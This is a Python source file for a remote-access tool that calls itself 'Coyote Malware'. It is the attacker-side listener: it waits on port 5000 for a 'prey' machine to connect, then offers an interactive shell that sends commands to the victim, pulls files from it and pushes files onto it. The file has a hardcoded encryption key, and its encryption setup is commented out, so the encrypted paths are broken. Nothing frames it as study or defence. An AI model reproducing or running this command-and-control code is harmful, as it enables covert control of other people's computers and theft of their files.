#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from cryptography.fernet import Fernet as fern
from optparse import OptionParser as op
from time import sleep
from sys import argv

class Coyote:
    def __init__(self, port, key, defaulthearing=True, printing=True):
        if(printing):
            print("Starting Coyote Malware...");
        self.conn = 0;
        #self.f = fern(key);
        self.sock = socket(AF_INET, SOCK_STREAM);
        self.sock.bind(('0.0.0.0', port));
        self.sock.listen(1);
        if(defaulthearing):
            if(printing):
                print("Waiting for prey");
            self.conn, addr = self.sock.accept();
            self.conn.settimeout(0.0);
            if(printing):
                print("They prey has connected");
    def shell(self):
        cmd = "";
        while cmd != "exit":
            cmd = input(">>>");
            if(cmd[:3] == "get"):
                self.getFile(cmd[4:]);
            elif(cmd[:4] == "send"):
                self.sendFile(cmd[5:]);
            else:
                self.send(cmd, encrypt=False);
                self.recv(decrypt=False, b=2048);
        self.conn.close();

    def send(self, msj, encrypt=True):
        if(type(msj) != type(b"byte")):
            msj = str(msj).encode();
        if(encrypt):
            msj = self.f.encrypt(msj);
        self.conn.send(msj);
    def getFile(self, file):
        with open(file, "wb") as f:
            try:
                self.conn.settimeout(10);
                content = self.recv(decode=False, decrypt=False, b=10240);
            except Exception as e:
                print(e);
            else:
                f.write(content);
            finally:
                self.conn.settimeout(0.0);

    def sendFile(self, file):
        try:
            with open(file,"rb") as f:
                content = f.read(1024);
        except FileNotFoundError:
            print("File not found.");
        else:
            self.send(content, encrypt=False );
    def recv(self, prnt = True, decode = True, decrypt = True, b=1024):
        try:
            msj = self.conn.recv(b);
        except:
            return 0;
        else:
            if(decrypt):
                msj = self.f.decrypt(msj);
            if(decode):
                msj = msj.decode();
            if(prnt):
                print(msj);
            return msj;



def main():
    c = Coyote(5000, b"dgjVmVHUY_0GlJ2t8aHX5YfacfGkQcLlcIREQ9nPd7U=");
    c.shell();

if __name__ == '__main__':
    main()

